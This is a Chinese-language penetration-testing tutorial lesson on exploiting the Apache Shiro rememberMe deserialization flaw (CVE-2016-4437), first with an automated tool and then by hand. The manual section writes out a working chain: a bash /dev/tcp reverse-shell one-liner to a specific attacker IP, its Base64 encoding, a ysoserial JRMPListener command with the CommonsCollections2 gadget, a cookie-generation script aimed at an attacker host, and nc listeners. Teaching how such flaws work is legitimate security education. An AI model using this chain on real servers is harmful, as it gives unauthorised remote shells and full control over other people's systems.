# 网络安全教程：P56：Shiro漏洞利用

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_1.png)

在本节课中，我们将学习如何对已发现的Apache Shiro反序列化漏洞（CVE-2016-4437）进行利用。我们将介绍两种方法：一种是使用自动化工具进行快速验证和利用，另一种是手工构造Payload进行更深入的利用。

## 漏洞利用概述

上一节我们介绍了Shiro漏洞的发现与验证。本节中，我们来看看如何进行漏洞利用。核心目标是利用该反序列化漏洞获取目标服务器的Shell权限。

## 方法一：使用自动化工具

为了简化利用过程，我们可以使用专门的工具。这里介绍一个可以检测和利用Shiro框架漏洞的工具。

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_3.png)

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_4.png)

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_6.png)

以下是使用该工具的步骤：

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_8.png)

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_10.png)

1.  **启动工具并设置目标**：将目标网站的URL复制到工具的“目标地址”输入框中。
2.  **选择验证方式**：点击“下一步”，工具会提示选择验证漏洞的方式。这里我们选择使用DNSLog平台（如`ceye.io`）进行无回显验证。
3.  **配置DNSLog平台**：在使用`ceye.io`前，需要在工具的配置文件（如`config.properties`）中设置你的专属域名和API Token。
    *   域名格式：`{your-identifier}.ceye.io`
    *   Token：在`ceye.io`用户面板获取的API凭证。
4.  **执行验证**：配置完成后，选择使用`ceye.io`进行验证并点击执行。工具会向目标发送特定的Payload。
5.  **检查结果**：刷新你的`ceye.io`控制台。如果收到一条DNS查询记录，则证明目标很可能存在漏洞。
6.  **进行利用**：验证成功后，工具界面通常会提供利用选项。例如，可以填写你的公网服务器IP和监听端口，然后点击“执行”来获取一个反弹Shell。

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_12.png)

**关键命令示例（在攻击机上监听端口）：**
```bash
nc -lvp 1234
```

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_14.png)

## 方法二：手工构造Payload

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_16.png)

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_17.png)

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_18.png)

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_20.png)

自动化工具虽然方便，但理解手工利用过程有助于深入掌握原理。手工利用的核心是构造一个能够执行系统命令的序列化Payload。

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_22.png)

以下是手工利用的步骤：

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_24.png)

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_26.png)

1.  **准备反弹Shell命令**：首先，确定一个反弹Shell到攻击机的命令。
    *   **公式**：`bash -i >& /dev/tcp/{攻击机IP}/{监听端口} 0>&1`
    *   例如：`bash -i >& /dev/tcp/120.27.61.239/2234 0>&1`

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_28.png)

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_29.png)

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_31.png)

2.  **对命令进行Base64编码**：由于Java运行时环境不支持直接的管道符和重定向，需要将整个命令进行Base64编码。
    *   可以使用在线编码网站或Linux命令：`echo -n “bash -i >& /dev/tcp/120.27.61.239/2234 0>&1” | base64`

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_33.png)

3.  **使用Ysoserial生成Payload**：`Ysoserial`是一个集成了多种Java反序列化Payload的工具集。
    *   **命令结构**：`java -cp ysoserial.jar {gadget链名称} “{要执行的命令}”`
    *   对于Shiro漏洞，常用的链是`CommonsCollections2`。我们需要先启动一个JRMP监听器，然后让目标连接过来执行命令。
    *   **启动JRMP监听器**：
        ```bash
        java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections2 “{Base64编码后的命令}”
        ```
        此命令会在攻击机的1099端口启动一个服务，等待目标连接。

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_35.png)

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_36.png)

4.  **生成RememberMe Cookie**：使用一个Python脚本（如`shiro_tool.py`）来生成恶意的RememberMe Cookie字段。这个脚本会模拟Shiro的加密过程，将指向我们JRMP监听器的Payload封装成Cookie。
    *   **命令示例**：
        ```bash
        python shiro_tool.py 139.9.198.30:1099
        ```
        这里的IP和端口是**攻击机**上JRMP监听器的地址。

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_38.png)

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_40.png)

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_42.png)

5.  **替换Cookie并发送**：用Burp Suite等工具捕获目标网站的登录请求，找到`rememberMe`字段，将其值替换为上一步生成的恶意Cookie字符串，然后发送请求。

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_44.png)

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_45.png)

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_47.png)

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_49.png)

6.  **接收反弹Shell**：在攻击机上，使用`nc`监听之前设定的端口（如2234）。如果一切正确，目标服务器会连接到攻击机的JRMP服务（1099端口），执行编码后的命令，从而在攻击机的2234端口弹回一个Shell。
    ```bash
    nc -lvp 2234
    ```

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_51.png)

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_53.png)

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_55.png)

**核心概念说明**：
*   **序列化/反序列化**：将对象状态转换为可存储或可传输格式的过程叫序列化，反之叫反序列化。Shiro将用户的登录信息序列化后加密存储在Cookie中。
*   **Gadget链**：指一系列存在于目标应用依赖库中的类和方法，攻击者通过精心构造的序列化数据，可以“链接”起这些类和方法，最终执行任意代码。`CommonsCollections2`是其中一条著名的链。
*   **JRMP**：Java远程方法协议。`Ysoserial`的`JRMPListener`模块会开启一个恶意的RMI服务，当目标反序列化Payload时，会去连接这个服务并加载执行恶意代码。

## 总结

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_62.png)

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_64.png)

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_66.png)

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_68.png)

本节课中我们一起学习了Apache Shiro反序列化漏洞的两种利用方法。
*   第一种是使用自动化工具，可以快速完成漏洞验证和简单的反弹Shell利用，适合实战中快速测试。
*   第二种是手工利用，涉及构造Base64编码的命令、使用`Ysoserial`生成Payload、启动JRMP监听器以及生成并替换Shiro的RememberMe Cookie。这种方法步骤较多，但能让我们更深入地理解漏洞利用的底层原理和反序列化攻击链的构造过程。

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_70.png)

![](img/789e46cb631f3a9789dab3c8a2a6c1fb_72.png)

在实际操作中，如果手工利用失败，需要仔细检查每一步：命令编码是否正确、JRMP监听器是否成功启动、生成Cookie时指定的攻击机地址和端口是否准确、以及目标环境是否存在相应的依赖库等。掌握这些原理和调试技巧，对于成为一名合格的渗透测试人员至关重要。
